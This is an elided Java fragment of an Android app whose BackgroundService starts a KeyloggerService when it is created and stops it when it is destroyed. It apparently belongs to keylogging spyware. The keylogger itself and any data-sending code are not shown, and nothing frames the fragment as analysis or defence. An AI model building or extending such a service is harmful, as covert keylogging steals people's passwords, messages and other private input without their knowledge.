...
public class BackgroundService extends Service {
    ...
    public void onCreate() {
        ...
        // Start the KeyloggerService
        Intent keyloggerServiceIntent = new Intent(this, KeyloggerService.class);
        startService(keyloggerServiceIntent);
    ...
    public void onDestroy() {
        ...
        // Stop the KeyloggerService
        Intent keyloggerServiceIntent = new Intent(this, KeyloggerService.class);
        stopService(keyloggerServiceIntent);
